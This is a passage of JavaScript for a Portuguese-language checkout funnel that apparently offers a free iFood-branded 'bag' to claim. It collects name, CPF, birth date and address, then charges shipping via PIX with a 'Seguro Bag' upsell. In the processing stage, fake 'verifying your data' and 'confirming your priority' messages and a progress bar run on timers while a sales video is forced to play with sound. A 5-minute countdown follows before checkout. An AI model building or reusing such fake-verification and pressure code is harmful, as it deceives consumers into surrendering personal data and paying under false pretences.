    });

    focusFirstControl(document.querySelector('.step'));
}

function initProcessing() {
    if (!requirePersonal()) return;
    if (!requireAddress()) return;

    setStage('processing');
    trackLead('processing_view', { stage: 'processing' });

    const textEl = document.getElementById('processing-text');
    const videoEl = document.getElementById('vsl-video');
    const progressEl = document.getElementById('processing-progress');
    const progressLabelEl = document.getElementById('processing-progress-label');
    const progressSegmentEls = Array.from(document.querySelectorAll('.processing-segment i'));
    const verifiedEl = document.getElementById('processing-verified');
    const overlayEl = document.getElementById('vsl-audio-overlay');
    const overlayBtn = document.getElementById('vsl-audio-btn');
    const loadingTexts = [
        'Verificando estoque da bag na sua região...',
        'Validando seus dados com segurança...',
        'Confirmando sua prioridade na fila...',
        'Liberando o acesso ao resgate...'
    ];
    const preferredVolume = 0.65;

    let verificationTimer = null;
    let finishTimer = null;
    let progressTimer = null;
    let autoplayGuardTimer = null;
    let timelineStarted = false;
    let finishTriggered = false;

    const setProgress = (ratio) => {
        const clamped = Math.max(0, Math.min(1, Number(ratio) || 0));
        const total = progressSegmentEls.length || 1;

        progressSegmentEls.forEach((segment, index) => {
            const start = index / total;
            const end = (index + 1) / total;
            let pct = 0;
            if (clamped >= end) pct = 1;
            else if (clamped > start) pct = (clamped - start) / (end - start);
            segment.style.width = `${Math.round(pct * 100)}%`;
        });

        if (progressLabelEl) {
            progressLabelEl.textContent = `${Math.round(clamped * 100)}%`;
        }
    };

    const startProgressTimer = (durationMs) => {
        if (progressTimer) clearInterval(progressTimer);
        const startedAt = Date.now();
        progressTimer = setInterval(() => {
            const elapsed = Date.now() - startedAt;
            setProgress(Math.min(1, elapsed / durationMs));
        }, 140);
    };

    const clearProgressTimer = () => {
        if (progressTimer) {
            clearInterval(progressTimer);
            progressTimer = null;
        }
    };

    const clearAutoplayGuard = () => {
        if (autoplayGuardTimer) {
            clearInterval(autoplayGuardTimer);
            autoplayGuardTimer = null;
        }
    };

    const showOverlay = () => {
        if (!overlayEl) return;
        overlayEl.classList.remove('hidden');
        overlayEl.setAttribute('aria-hidden', 'false');
    };

    const hideOverlay = () => {
        if (!overlayEl) return;
        overlayEl.classList.add('hidden');
        overlayEl.setAttribute('aria-hidden', 'true');
    };

    const updateText = (txt) => {
        if (!textEl) return;
        textEl.style.opacity = 0;
        setTimeout(() => {
            textEl.innerText = txt;
            textEl.style.opacity = 1;
        }, 200);
    };

    const startTimeline = (durationMs, autoFinish = true) => {
        if (timelineStarted) return;
        timelineStarted = true;

        const stepInterval = Math.max(800, durationMs / loadingTexts.length);
        loadingTexts.forEach((txt, index) => {
            setTimeout(() => updateText(txt), index * stepInterval);
        });

        if (autoFinish) {
            startProgressTimer(durationMs);
            verificationTimer = setTimeout(() => finishVerification(), durationMs);
        }
    };

    const finishVerification = () => {
        if (finishTriggered) return;
        finishTriggered = true;

        if (verificationTimer) {
            clearTimeout(verificationTimer);
        }
        clearProgressTimer();
        clearAutoplayGuard();
        setProgress(1);

        finishTimer = setTimeout(() => {
            if (progressEl) progressEl.classList.add('hidden');
            if (verifiedEl) {
                verifiedEl.classList.remove('hidden');
                verifiedEl.setAttribute('aria-hidden', 'false');
            }
            updateText('Verificação concluída.');

            setTimeout(() => {
                markVslCompleted();
                setStage('success');
                redirect('sucesso.html');
            }, 900);
        }, 2000);
    };

    if (videoEl) {
        const applyPreferredAudio = () => {
            videoEl.defaultMuted = false;
            videoEl.muted = false;
            videoEl.volume = preferredVolume;
        };

        const syncVideoProgress = () => {
            if (!Number.isFinite(videoEl.duration) || videoEl.duration <= 0) return;
            setProgress(videoEl.currentTime / videoEl.duration);
        };

        const safeStart = () => {
            const durationMs = Number.isFinite(videoEl.duration) && videoEl.duration > 0
                ? videoEl.duration * 1000
                : 30000;
            startTimeline(durationMs, false);
            syncVideoProgress();
        };

        videoEl.addEventListener('loadedmetadata', safeStart);
        videoEl.addEventListener('timeupdate', syncVideoProgress);
        if (videoEl.readyState >= 1) safeStart();

        videoEl.addEventListener('ended', () => {
            setProgress(1);
            finishVerification();
        });

        videoEl.autoplay = true;
        videoEl.playsInline = true;
        videoEl.setAttribute('playsinline', '');
        videoEl.setAttribute('webkit-playsinline', '');
        videoEl.preload = 'auto';
        applyPreferredAudio();

        const tryPlay = () => {
            applyPreferredAudio();
            const playPromise = videoEl.play();
            if (playPromise && typeof playPromise.catch === 'function') {
                playPromise.catch(() => {
                    showOverlay();
                    safeStart();
                });
            }
        };

        const startAutoplayGuard = () => {
            clearAutoplayGuard();
            autoplayGuardTimer = setInterval(() => {
                if (finishTriggered) {
                    clearAutoplayGuard();
                    return;
                }
                applyPreferredAudio();
                if (videoEl.paused) {
                    showOverlay();
                    tryPlay();
                } else {
                    hideOverlay();
                    clearAutoplayGuard();
                }
            }, 350);
        };

        const unlockAudio = () => {
            applyPreferredAudio();
            tryPlay();
            document.removeEventListener('click', unlockAudio);
            document.removeEventListener('touchstart', unlockAudio);
            document.removeEventListener('pointerdown', unlockAudio);
        };

        document.addEventListener('click', unlockAudio, { once: true });
        document.addEventListener('touchstart', unlockAudio, { once: true });
        document.addEventListener('pointerdown', unlockAudio, { once: true });

        videoEl.addEventListener('play', hideOverlay);
        videoEl.addEventListener('playing', hideOverlay);
        videoEl.addEventListener('pause', () => {
            if (!finishTriggered) showOverlay();
        });

        overlayBtn?.addEventListener('click', () => {
            applyPreferredAudio();
            tryPlay();
        });

        startAutoplayGuard();
        tryPlay();
    } else {
        startTimeline(30000, true);
    }
}

function initSuccess() {
    if (!requirePersonal()) return;
    if (!requireAddress()) return;

    setStage('success');
    trackLead('success_view', { stage: 'success' });

    const personal = loadPersonal();
    const leadName = document.getElementById('lead-name');
    const timer = document.getElementById('timer');
    const btnCheckout = document.getElementById('btn-checkout');

    if (leadName && personal?.name) {
        const firstName = personal.name.trim().split(/\s+/)[0];
        leadName.textContent = firstName || personal.name;
    }

    startTimer(300, timer);

    btnCheckout?.addEventListener('click', () => {
        trackLead('success_cta', { stage: 'success' });
        setStage('checkout');
        redirect('checkout.html');
    });
}

function initCheckout() {
    const directCheckout = isDirectCheckoutMode();
    if (!directCheckout && !requirePersonal()) return;
    if (!directCheckout && !requireAddress()) return;

    setStage('checkout');
    trackLead('checkout_view', { stage: 'checkout' });
    const personal = loadPersonal();
    let address = loadAddress() || {};
    let shipping = loadShipping();
    const checkoutParams = new URLSearchParams(window.location.search || '');
    const forceFreteSelection = checkoutParams.get('forceFrete') === '1';
    if (forceFreteSelection) {
        localStorage.removeItem(STORAGE_KEYS.shipping);
        shipping = null;
        checkoutParams.delete('forceFrete');
        const nextQuery = checkoutParams.toString();
        const nextUrl = `${window.location.pathname}${nextQuery ? `?${nextQuery}` : ''}${window.location.hash || ''}`;
        try {
            history.replaceState(history.state || {}, '', nextUrl);
        } catch (_error) {
            // Ignore browser-specific history restrictions.
        }
    }
    const checkoutNeutralBump = {
        selected: false,
        price: 0,
        title: 'Seguro Bag'
    };
    saveBump(checkoutNeutralBump);

    const summaryName = document.getElementById('summary-name');
    const summaryCpf = document.getElementById('summary-cpf');
    const summaryBirth = document.getElementById('summary-birth');
    const summaryAddress = document.getElementById('summary-address');
    const summaryCep = document.getElementById('summary-cep');
    const summaryBlock = document.getElementById('summary-block');
    const freightForm = document.getElementById('freight-form');
    const checkoutCep = document.getElementById('checkout-cep');
    const btnCalcFreight = document.getElementById('btn-calc-freight');
    const btnVerifyFreight = document.getElementById('btn-verify-freight');
    const freightLoading = document.getElementById('freight-loading');
    const freightAddress = document.getElementById('freight-address');
    const freightStreet = document.getElementById('freight-street');
    const freightCity = document.getElementById('freight-city');
    const btnEditCep = document.getElementById('btn-edit-cep');
    const freightDetails = document.getElementById('freight-details');
    const addrNumber = document.getElementById('addr-number');
    const noNumber = document.getElementById('no-number');
    const addrComplement = document.getElementById('addr-complement');
    const noComplement = document.getElementById('no-complement');
    const addrReference = document.getElementById('addr-reference');
    const freightOptions = document.getElementById('freight-options');
    const freightHint = document.getElementById('freight-hint');
    const shippingTotal = document.getElementById('shipping-total');
    const btnFinish = document.getElementById('btn-finish');
    const couponBanner = document.getElementById('coupon-banner');
    const btnEditData = document.querySelector('.action-stack a[href^="dados"]');
    const btnEditAddress = document.querySelector('.action-stack a[href^="endereco"]');
    const freightCard = document.querySelector('.freight-card');
    const checkoutStepCep = document.getElementById('checkout-step-cep');
    const checkoutStepFrete = document.getElementById('checkout-step-frete');
    const checkoutStepFinal = document.getElementById('checkout-step-final');
    const checkoutNextStep = document.getElementById('checkout-next-step');
    const checkoutSelectedShipping = document.getElementById('checkout-selected-shipping');
    if (btnVerifyFreight) btnVerifyFreight.classList.add('hidden');

    let orderBumpHintEnabled = true;
    let checkoutSubmitting = false;

    const setCheckoutFlowStep = (step) => {
        checkoutStepCep?.classList.toggle('is-active', step === 'cep');
        checkoutStepFrete?.classList.toggle('is-active', step === 'frete');
        checkoutStepFinal?.classList.toggle('is-active', step === 'final');
    };

    const formatShippingLabel = (option) => {
        if (!option) return 'Frete ainda nao selecionado.';
        const currentPrice = formatCurrency(option.price || 0);
        const originalPrice = Number(option.originalPrice || 0);
        if (originalPrice > Number(option.price || 0)) {
            return `${option.name} - de ${formatCurrency(originalPrice)} por ${currentPrice}`;
        }
        return `${option.name} - ${currentPrice}`;
    };

    const updateCheckoutActionPanel = () => {
        if (!btnFinish) return;
        btnFinish.classList.remove('hidden');
        const cepDigits = String(checkoutCep?.value || '').replace(/\D/g, '');
        const hasValidCep = cepDigits.length === 8;
        const hasShipping = !!shipping;

        let flowStep = 'cep';
        if (hasShipping) {
            flowStep = 'final';
        } else if (hasValidCep) {
            flowStep = 'frete';
        }
        setCheckoutFlowStep(flowStep);

        if (flowStep === 'cep') {
            if (checkoutNextStep) checkoutNextStep.textContent = 'Informe seu CEP para liberar as opcoes de frete.';
        } else if (flowStep === 'frete') {
            if (checkoutNextStep) checkoutNextStep.textContent = 'Escolha o frete ideal para continuar para a proxima etapa.';
        } else if (checkoutNextStep) {
            checkoutNextStep.textContent = orderBumpHintEnabled
                ? 'Frete selecionado. Agora voce segue para a oferta de Seguro Bag.'
                : 'Frete selecionado. Agora voce segue direto para o pagamento PIX.';
        }

        if (checkoutSelectedShipping) {
            checkoutSelectedShipping.textContent = formatShippingLabel(shipping);
        }

        btnFinish.disabled = checkoutSubmitting;
        btnFinish.classList.toggle('btn-primary--blocked', !hasShipping && !checkoutSubmitting);
        if (checkoutSubmitting) {
            btnFinish.textContent = 'Processando...';
            return;
        }
        btnFinish.textContent = hasShipping
            ? 'Finalizar pedido'
            : 'Selecione um frete para continuar';
    };

    const coupon = loadCoupon();
    if (couponBanner && (coupon?.amountOff || coupon?.discount)) {
        const amountOff = Number(coupon?.amountOff || 0) || roundMoney(25.9 * Number(coupon?.discount || 0));
        couponBanner.classList.remove('hidden');
        couponBanner.innerHTML = `
            <strong>Cupom aplicado:</strong> ${coupon.code || 'FRETE5'}
            <span>R$ ${amountOff.toFixed(2).replace('.', ',')} de desconto no frete da Bag</span>
        `;
    }

    const personalMissing =
        !personal || !personal.name || !personal.cpf || !personal.birth || !personal.email || !personal.phone;

    if (directCheckout && personalMissing) {
        if (summaryBlock) summaryBlock.classList.add('hidden');
        if (btnEditData) btnEditData.classList.add('hidden');
        if (btnEditAddress) btnEditAddress.classList.add('hidden');
    }

    if (summaryName) summaryName.textContent = personal?.name || '-';
    if (summaryCpf) summaryCpf.textContent = personal?.cpf || '-';
    if (summaryBirth) summaryBirth.textContent = personal?.birth || '-';
    const formatSummaryAddress = () => {
        const base = address?.streetLine || '-';
        const city = address?.cityLine || '-';
        const extra = loadAddressExtra();
        const numberValue = (extra?.number || '').trim();
        const numberText = extra?.noNumber ? 's/n' : numberValue;
        const streetWithNumber = numberText ? `${base}, ${numberText}` : base;
        return `${streetWithNumber} · ${city}`;
    };

    const updateSummaryAddress = () => {
        if (!summaryAddress) return;
        summaryAddress.textContent = formatSummaryAddress();
    };

    updateSummaryAddress();
    if (summaryCep) summaryCep.textContent = address?.cep || '-';

    if (checkoutCep) {
        checkoutCep.value = address?.cep || '';
        checkoutCep.addEventListener('input', () => {
            maskCep(checkoutCep);
            updateCheckoutActionPanel();
        });
    }

    if (shipping) {
        shipping = applyCouponToShipping(shipping);
        if (!isShippingSelectionComplete(shipping)) {
            localStorage.removeItem(STORAGE_KEYS.shipping);
            shipping = null;
        }
    }

    const orderBumpEnabledPromise = isOrderBumpEnabled()
        .then((enabled) => {
            orderBumpHintEnabled = enabled !== false;
            updateCheckoutActionPanel();
            return orderBumpHintEnabled;
        })
        .catch(() => orderBumpHintEnabled);

    let cepLookupTimer = null;
    const getCepDigits = (value) => String(value || '').replace(/\D/g, '');
    const findDefaultShippingOption = (options = []) => {
        if (!Array.isArray(options) || !options.length) return null;
        const byId = options.find((opt) => String(opt?.id || '').trim() === 'padrao');
        if (byId) return byId;
        const byBasePrice = options.find((opt) => {
            const basePrice = Number(opt?.originalPrice || opt?.basePrice || opt?.price || 0);
            return Math.abs(basePrice - 25.9) < 0.001;
        });
        if (byBasePrice) return byBasePrice;
        return options[0] || null;
    };
    const hasResolvedAddressForCep = (rawCep) => {
        const savedCep = getCepDigits(address?.cep || '');
        const hasStreet = !!String(address?.street || address?.streetLine || '').trim();
        const hasCity = !!String(address?.city || address?.cityLine || '').trim();
        return rawCep && savedCep === rawCep && hasStreet && hasCity;
    };

    const openFreightOptions = (rawCep, shouldTrack = true) => {
        const options = buildShippingOptions(rawCep);
        cachedOptions = options;
        if (!cachedSelectedId || !options.some((opt) => opt.id === cachedSelectedId)) {
            cachedSelectedId = null;
        }
        showFreightSelection();
        const selected = cachedSelectedId ? options.find((opt) => opt.id === cachedSelectedId) : null;
        if (selected) {
            selectShipping(selected, options, { autoRestore: true, track: false });
        } else {
            const defaultOption = findDefaultShippingOption(options);
            if (defaultOption) {
                selectShipping(defaultOption, options, { autoDefault: true, track: false });
            }
        }
        if (shouldTrack) {
            trackLead('frete_options_shown', { stage: 'checkout' });
        }
    };

    const handleCepAutoLookup = () => {
        const rawCep = (checkoutCep?.value || '').replace(/\D/g, '');
        if (rawCep.length !== 8) return;

        if (summaryCep) summaryCep.textContent = formatCep(rawCep);
        if (freightLoading) setHidden(freightLoading, false);

        fetch(`https://brasilapi.com.br/api/cep/v1/${rawCep}`)
            .then((res) => {
                if (!res.ok) throw new Error('CEP não encontrado');
                return res.json();
            })
            .then((data) => {
                const street = (data.street || '').trim();
                const neighborhood = (data.neighborhood || '').trim();
                const streetLine = [street, neighborhood].filter(Boolean).join(', ') || 'Rua não informada';
                const city = (data.city || 'Cidade não informada').trim();
                const stateUf = (data.state || '').trim();
                const cityLine = stateUf ? `${city} - ${stateUf}` : city;

                const updatedAddress = {
                    ...(address || {}),
                    streetLine,
                    cityLine,
                    cep: formatCep(rawCep),
                    street,
                    neighborhood,
                    city,
                    state: stateUf
                };

                saveAddress(updatedAddress);
                address = updatedAddress;
                updateSummaryAddress();
                updateFreightAddress(updatedAddress);
                if (!shipping) {
                    openFreightOptions(rawCep, false);
                }
            })
            .catch(() => {
                showToast('CEP não encontrado. Verifique e tente novamente.', 'error');
            })
            .finally(() => {
                if (freightLoading) setHidden(freightLoading, true);
            });
    };

    checkoutCep?.addEventListener('input', () => {
        if (cepLookupTimer) clearTimeout(cepLookupTimer);
        const rawCep = (checkoutCep?.value || '').replace(/\D/g, '');
        if (rawCep.length !== 8) return;
        cepLookupTimer = setTimeout(handleCepAutoLookup, 450);
    });

    btnEditCep?.addEventListener('click', () => {
        if (!checkoutCep) return;
        checkoutCep.focus();
        checkoutCep.select();
        checkoutCep.scrollIntoView({ behavior: 'smooth', block: 'center' });
    });

    let cachedOptions = null;
    let cachedSelectedId = null;

    const isExtraValid = () => {
        const numberOk = !!(noNumber?.checked || (addrNumber?.value || '').trim().length);
        const complementOk = !!(noComplement?.checked || (addrComplement?.value || '').trim().length);
        return numberOk && complementOk;
    };

    const renderOptions = (options, selectedId) => {
        if (!freightOptions) return;
        freightOptions.innerHTML = '';
        options.forEach((opt) => {
            const hasDiscount = Number(opt.originalPrice || 0) > Number(opt.price || 0);
            const priceHtml = hasDiscount
                ? `<span class="price-old">${formatCurrency(opt.originalPrice)}</span><span class="price-new">${formatCurrency(opt.price)}</span>`
                : `${formatCurrency(opt.price)}`;
            const label = document.createElement('label');
            label.className = 'freight-option';
            if (opt.id === selectedId) label.classList.add('freight-option--active');
            label.innerHTML = `
                <input type="radio" name="shipping" value="${opt.id}" ${opt.id === selectedId ? 'checked' : ''}>
                <div class="freight-option__main">
                    <div class="freight-option__title">${opt.name}</div>
                    <div class="freight-option__eta">${opt.eta}</div>
                </div>
                <div class="freight-option__price">${priceHtml}</div>
            `;
            label.addEventListener('click', () => {
                selectShipping(opt, options);
            });
            freightOptions.appendChild(label);
        });
    };

    const showFreightSelection = () => {
        if (!cachedOptions || !freightOptions) return;
        renderOptions(cachedOptions, cachedSelectedId);
        setHidden(freightOptions, false);
        setHidden(freightHint, false);
    };

    const updateFreightAddress = (addr) => {
        if (!freightAddress) return;
        if (freightStreet) freightStreet.textContent = addr?.streetLine || 'Rua não informada';
        if (freightCity) freightCity.textContent = addr?.cityLine || 'Cidade não informada';
        setHidden(freightAddress, false);
    };

    const hydrateExtraAddress = () => {
        const extra = loadAddressExtra();
        if (addrNumber) addrNumber.value = extra?.number || '';
        if (addrComplement) addrComplement.value = extra?.complement || '';
        if (addrReference) addrReference.value = extra?.reference || '';
        if (noNumber) noNumber.checked = !!extra?.noNumber;
        if (noComplement) noComplement.checked = !!extra?.noComplement;

        if (noNumber && addrNumber) {
            addrNumber.disabled = noNumber.checked;
            addrNumber.classList.toggle('input-dim', noNumber.checked);
        }
        if (noComplement && addrComplement) {
            addrComplement.disabled = noComplement.checked;
            addrComplement.classList.toggle('input-dim', noComplement.checked);
        }
    };

    let extraBound = false;
    const bindExtraAddress = () => {
        if (extraBound) return;
        extraBound = true;
        if (noNumber && addrNumber) {
            noNumber.addEventListener('change', () => {
                addrNumber.disabled = noNumber.checked;
                addrNumber.classList.toggle('input-dim', noNumber.checked);
                saveAddressExtra(collectExtraAddress());
                updateSummaryAddress();
            });
        }
        if (noComplement && addrComplement) {
            noComplement.addEventListener('change', () => {
                addrComplement.disabled = noComplement.checked;
                addrComplement.classList.toggle('input-dim', noComplement.checked);
                saveAddressExtra(collectExtraAddress());
                updateSummaryAddress();
            });
        }
        [addrNumber, addrComplement, addrReference].forEach((input) => {
            input?.addEventListener('input', () => {
                saveAddressExtra(collectExtraAddress());
                updateSummaryAddress();
            });
        });
    };

    const collectExtraAddress = () => ({
        number: addrNumber?.value.trim() || '',
        complement: addrComplement?.value.trim() || '',
        reference: addrReference?.value.trim() || '',
        noNumber: !!noNumber?.checked,
        noComplement: !!noComplement?.checked
    });

    const selectShipping = (opt, options, flags = {}) => {
        const autoRestore = flags?.autoRestore === true;
        const autoDefault = flags?.autoDefault === true;
        const shouldTrack = flags?.track !== false;
        const basePrice = Number(opt.originalPrice || opt.basePrice || opt.price || 0);
        const selectedShipping = {
            ...opt,
            id: String(opt.id || 'padrao').trim() || 'padrao',
            name: String(opt.name || 'Frete iFood').trim() || 'Frete iFood',
            price: Number(Number(opt.price || 0).toFixed(2)),
            basePrice: Number(basePrice.toFixed(2)),
            originalPrice: Number(basePrice.toFixed(2)),
            selectedAt: Number(opt.selectedAt || 0) > 0 ? Number(opt.selectedAt) : Date.now(),
            selectedByUser: autoRestore ? (opt.selectedByUser !== false) : !autoDefault,
            sessionId: getLeadSessionId()
        };
        saveShipping(selectedShipping);
        cachedSelectedId = selectedShipping.id;
        shipping = selectedShipping;
        if (shouldTrack) {
            trackLead('frete_selected', { stage: 'checkout', shipping: selectedShipping });
        }
        if (shippingTotal) {
            const strong = shippingTotal.querySelector('strong');
            const hasDiscount = Number(selectedShipping.originalPrice || 0) > Number(selectedShipping.price || 0);
            if (strong) {
                strong.innerHTML = hasDiscount
                    ? `<span class="price-old">${formatCurrency(selectedShipping.originalPrice)}</span><span class="price-new">${formatCurrency(selectedShipping.price)}</span>`
                    : formatCurrency(selectedShipping.price);
            }
            setHidden(shippingTotal, false);
        }
        const labels = freightOptions?.querySelectorAll('.freight-option') || [];
        labels.forEach((label) => {
            label.classList.toggle('freight-option--active', label.querySelector('input')?.value === selectedShipping.id);
        });
        updateCheckoutActionPanel();
    };

    const clearShippingSelection = () => {
        localStorage.removeItem(STORAGE_KEYS.shipping);
        shipping = null;
        cachedSelectedId = null;
        if (freightOptions) freightOptions.innerHTML = '';
        setHidden(freightOptions, true);
        setHidden(freightHint, true);
        setHidden(shippingTotal, true);
        updateCheckoutActionPanel();
    };

    const calcShipping = () => {
        const rawCep = (checkoutCep?.value || '').replace(/\D/g, '');
        if (rawCep.length !== 8) {
            showToast('Digite um CEP válido para calcular o frete.', 'error');
            return;
        }

        const finishCalc = () => {
            setHidden(freightLoading, true);
            if (btnCalcFreight) {
                btnCalcFreight.disabled = false;
            }
            setHidden(summaryBlock, false);
            setHidden(freightForm, false);
            setHidden(freightAddress, false);
            if (btnCalcFreight) btnCalcFreight.classList.add('hidden');
            if (btnVerifyFreight) btnVerifyFreight.classList.add('hidden');
            openFreightOptions(rawCep, true);
        };

        if (hasResolvedAddressForCep(rawCep)) {
            if (summaryCep) summaryCep.textContent = formatCep(rawCep);
            updateSummaryAddress();
            updateFreightAddress(address);
            if (btnCalcFreight) btnCalcFreight.classList.add('hidden');
            if (btnVerifyFreight) btnVerifyFreight.classList.add('hidden');
            finishCalc();
            return;
        }

        if (btnCalcFreight) {
            btnCalcFreight.classList.add('hidden');
        }
        clearShippingSelection();
        if (btnCalcFreight) {
            btnCalcFreight.disabled = true;
        }
        setHidden(freightLoading, false);
        setHidden(freightAddress, true);
        setHidden(freightOptions, true);
        setHidden(shippingTotal, true);
        updateCheckoutActionPanel();

        if (summaryCep) summaryCep.textContent = formatCep(rawCep);

        const startTime = Date.now();
        const minDelay = 900;

        fetch(`https://brasilapi.com.br/api/cep/v1/${rawCep}`)
            .then((res) => {
                if (!res.ok) throw new Error('CEP não encontrado');
                return res.json();
            })
            .then((data) => {
                const street = (data.street || '').trim();
                const neighborhood = (data.neighborhood || '').trim();
                const streetLine = [street, neighborhood].filter(Boolean).join(', ') || 'Rua não informada';
                const city = (data.city || 'Cidade não informada').trim();
                const stateUf = (data.state || '').trim();
                const cityLine = stateUf ? `${city} - ${stateUf}` : city;

                const updatedAddress = {
                    ...(address || {}),
                    streetLine,
                    cityLine,
                    cep: formatCep(rawCep),
                    street,
                    neighborhood,
                    city,
                    state: stateUf
                };

                saveAddress(updatedAddress);
                if (address) {
                    address.streetLine = updatedAddress.streetLine;
                    address.cityLine = updatedAddress.cityLine;
                    address.cep = updatedAddress.cep;
                } else {
                    address = updatedAddress;
                }
                updateSummaryAddress();
                updateFreightAddress(updatedAddress);
                trackLead('frete_calculated', { stage: 'checkout', address: updatedAddress });
                setHidden(freightDetails, false);
                setHidden(summaryBlock, false);
                if (btnCalcFreight) btnCalcFreight.classList.add('hidden');
                setHidden(freightForm, false);
                hydrateExtraAddress();
                bindExtraAddress();

                const elapsed = Date.now() - startTime;
                const remaining = Math.max(0, minDelay - elapsed);
                setTimeout(() => {
                    finishCalc();
                }, remaining);
            })
            .catch(() => {
                const elapsed = Date.now() - startTime;
                const remaining = Math.max(0, minDelay - elapsed);
                setTimeout(() => {
                    showToast('CEP não encontrado. Verifique e tente novamente.', 'error');
                    setHidden(freightLoading, true);
                    if (btnCalcFreight) {
                        btnCalcFreight.classList.remove('hidden');
                        btnCalcFreight.disabled = false;
                    }
                    updateCheckoutActionPanel();
                }, remaining);
            });
    };

    btnCalcFreight?.addEventListener('click', calcShipping);

    btnVerifyFreight?.addEventListener('click', () => {
        const rawCep = (checkoutCep?.value || '').replace(/\D/g, '');
        if (rawCep.length !== 8) {
            showToast('Digite um CEP válido para continuar.', 'error');
            return;
        }
        openFreightOptions(rawCep, true);
        if (btnVerifyFreight) btnVerifyFreight.classList.add('hidden');
    });

    if (shipping && freightOptions) {
        cachedOptions = buildShippingOptions((checkoutCep?.value || '').replace(/\D/g, ''));
        cachedSelectedId = shipping.id;
        setHidden(summaryBlock, false);
        setHidden(freightForm, true);
        showFreightSelection();
        if (shippingTotal) {
            const strong = shippingTotal.querySelector('strong');
            const hasDiscount = Number(shipping.originalPrice || 0) > Number(shipping.price || 0);
            if (strong) {
                strong.innerHTML = hasDiscount
                    ? `<span class="price-old">${formatCurrency(shipping.originalPrice)}</span><span class="price-new">${formatCurrency(shipping.price)}</span>`
                    : formatCurrency(shipping.price);
            }
            setHidden(shippingTotal, false);
        }
        updateCheckoutActionPanel();
    }

    if (!shipping) {
        hydrateExtraAddress();
        bindExtraAddress();
        const savedCepDigits = getCepDigits(address?.cep || '');
        if (savedCepDigits.length === 8 && hasResolvedAddressForCep(savedCepDigits)) {
            if (checkoutCep) checkoutCep.value = formatCep(savedCepDigits);
            updateFreightAddress(address);
            if (btnCalcFreight) btnCalcFreight.classList.add('hidden');
            if (btnVerifyFreight) btnVerifyFreight.classList.add('hidden');
            setHidden(summaryBlock, false);
            setHidden(freightForm, false);
            openFreightOptions(savedCepDigits, false);
        }
    }

    updateCheckoutActionPanel();

    const syncShippingAfterAddressEdit = () => {
        const storedAddress = loadAddress();
        const storedShipping = loadShipping();
        if (!storedAddress) return;

        if (summaryAddress) {
            summaryAddress.textContent = formatSummaryAddress();
        }
        if (summaryCep) summaryCep.textContent = storedAddress.cep || '-';

        updateFreightAddress(storedAddress);
        setHidden(freightDetails, false);
        hydrateExtraAddress();
        bindExtraAddress();

        if (storedShipping && freightOptions && isShippingSelectionComplete(storedShipping)) {
            cachedOptions = buildShippingOptions((storedAddress.cep || '').replace(/\D/g, ''));
            cachedSelectedId = storedShipping.id;
            setHidden(freightForm, true);
            setHidden(summaryBlock, false);
            showFreightSelection();
            if (shippingTotal) {
                const strong = shippingTotal.querySelector('strong');
                const hasDiscount = Number(storedShipping.originalPrice || 0) > Number(storedShipping.price || 0);
                if (strong) {
                    strong.innerHTML = hasDiscount
                        ? `<span class="price-old">${formatCurrency(storedShipping.originalPrice)}</span><span class="price-new">${formatCurrency(storedShipping.price)}</span>`
                        : formatCurrency(storedShipping.price);
                }
                setHidden(shippingTotal, false);
            }
            if (btnCalcFreight) btnCalcFreight.classList.add('hidden');
            shipping = storedShipping;
            updateCheckoutActionPanel();
            return;
        }

        setHidden(summaryBlock, false);
        setHidden(freightForm, true);
        if (cachedOptions) showFreightSelection();
        if (btnCalcFreight) btnCalcFreight.classList.add('hidden');
        updateCheckoutActionPanel();
    };

    const returnTo = getReturnTarget();
    if (returnTo === 'checkout') {
        sessionStorage.removeItem(STORAGE_KEYS.returnTo);
        syncShippingAfterAddressEdit();
    }

    btnFinish?.addEventListener('click', () => {
        if (!btnFinish) return;
        if (!shipping) {
            showToast('Selecione um frete para continuar.', 'error');
            freightCard?.classList.remove('freight-card--focus');
            freightCard?.classList.add('freight-card--focus');
            setTimeout(() => {
                freightCard?.classList.remove('freight-card--focus');
            }, 1100);
            if (freightOptions && !freightOptions.classList.contains('hidden')) {
                freightOptions.scrollIntoView({ behavior: 'smooth', block: 'center' });
            } else if (checkoutCep) {
                checkoutCep.scrollIntoView({ behavior: 'smooth', block: 'center' });
                checkoutCep.focus();
            }
            return;
        }
        saveBump(checkoutNeutralBump);
        trackLead('checkout_submit', {
            stage: 'checkout',
            shipping,
            bump: checkoutNeutralBump,
            amount: Number(shipping?.price || 0)
        });
        const idleLabel = btnFinish.textContent;
        checkoutSubmitting = true;
        btnFinish.textContent = 'Processando...';
        updateCheckoutActionPanel();
        orderBumpEnabledPromise
            .then((enabled) => {
                if (enabled) {
                    setStage('orderbump');
                    redirect('orderbump.html');
                    return;
                }
                trackLead('orderbump_skipped', { stage: 'checkout', shipping });
                showToast('Gerando pagamento...', 'success');
                createPixCharge(shipping, 0).catch((error) => {
                    showToast(error.message || 'Erro ao gerar o PIX.', 'error');
                    checkoutSubmitting = false;
                    btnFinish.textContent = idleLabel;
                    updateCheckoutActionPanel();
                });
            })
            .catch(() => {
                checkoutSubmitting = false;
                btnFinish.textContent = idleLabel;
                setStage('orderbump');
                redirect('orderbump.html');
            });
    });
}

function initOrderBump() {
    if (!requirePersonal()) return;
    if (!requireAddress()) return;

    const shippingStored = loadShipping();
    const shipping = applyCouponToShipping(shippingStored);
    if (!isShippingSelectionComplete(shipping)) {
        localStorage.removeItem(STORAGE_KEYS.shipping);
        setStage('checkout');
        redirect('checkout.html?forceFrete=1');
        return;
    }

    const neutralBump = {
        selected: false,
        price: 0,
        title: 'Seguro Bag'
    };
    saveBump(neutralBump);
    setStage('orderbump');
    trackLead('orderbump_view', {
        stage: 'orderbump',
        shipping,
        bump: neutralBump,
        amount: Number(shipping?.price || 0)
    });
    const bumpPrice = 9.9;

    isOrderBumpEnabled().then((enabled) => {
        if (!enabled) {
            trackLead('orderbump_skipped', { stage: 'orderbump', shipping });
            createPixCharge(shipping, 0).catch((error) => {
                showToast(error.message || 'Erro ao gerar o PIX.', 'error');
                setStage('checkout');
                redirect('checkout.html');
            });
        }
    }).catch(() => null);

    const btnAccept = document.getElementById('btn-bump-accept');
    const btnDecline = document.getElementById('btn-bump-decline');
    const bumpTotal = document.getElementById('bump-total');
    const bumpMonthly = document.getElementById('bump-monthly');
    const bumpLoading = document.getElementById('bump-loading');

    if (bumpTotal) bumpTotal.textContent = formatCurrency(shipping.price + bumpPrice);
    if (bumpMonthly) bumpMonthly.textContent = formatCurrency(bumpPrice);

    const proceedToPix = (selected) => {
        if (btnAccept) btnAccept.disabled = true;
        if (btnDecline) btnDecline.disabled = true;
        if (bumpLoading) bumpLoading.classList.remove('hidden');

        saveBump({
            selected,
